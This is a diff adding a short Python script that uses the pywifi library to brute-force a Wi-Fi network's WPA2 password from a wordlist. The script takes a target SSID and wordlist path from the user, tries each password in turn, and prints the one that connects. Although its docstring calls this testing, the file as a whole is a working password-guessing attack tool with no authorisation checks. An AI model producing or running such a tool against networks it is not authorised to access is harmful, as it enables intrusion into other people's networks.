@@ -1,0 +1,49 @@
+import pywifi
+from pywifi import const
+import time
+
+def test_wifi_password(ssid, wordlist_path):
+    """Test passwords from a wordlist on a Wi-Fi network."""
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
+    
+    # Disconnect from any existing connection
+    iface.disconnect()
+    time.sleep(1)
+    
+    # Open the wordlist
+    try:
+        with open(wordlist_path, 'r') as wordlist:
+            for password in wordlist:
+                password = password.strip()
+                print(f"Trying password: {password}")
+                
+                # Configure the profile
+                profile = pywifi.Profile()
+                profile.ssid = ssid
+                profile.key = password
+                profile.auth = const.AUTH_ALG_OPEN
+                profile.akm.append(const.AKM_TYPE_WPA2PSK)
+                profile.cipher = const.CIPHER_TYPE_CCMP
+                
+                iface.remove_all_network_profiles()
+                iface.add_network_profile(profile)
+                
+                # Attempt to connect
+                iface.connect(profile)
+                time.sleep(5)  # Wait for connection attempt
+                
+                if iface.status() == const.IFACE_CONNECTED:
+                    print(f"Success! Password is: {password}")
+                    iface.disconnect()
+                    return
+                else:
+                    print("Failed.")
+            print("Password not found in wordlist.")
+    except FileNotFoundError:
+        print("Wordlist file not found.")
+
+if __name__ == "__main__":
+    ssid = input("Enter the SSID of the network to test: ")
+    wordlist_path = input("Enter the path to the wordlist file: ")
+    test_wifi_password(ssid, wordlist_path)
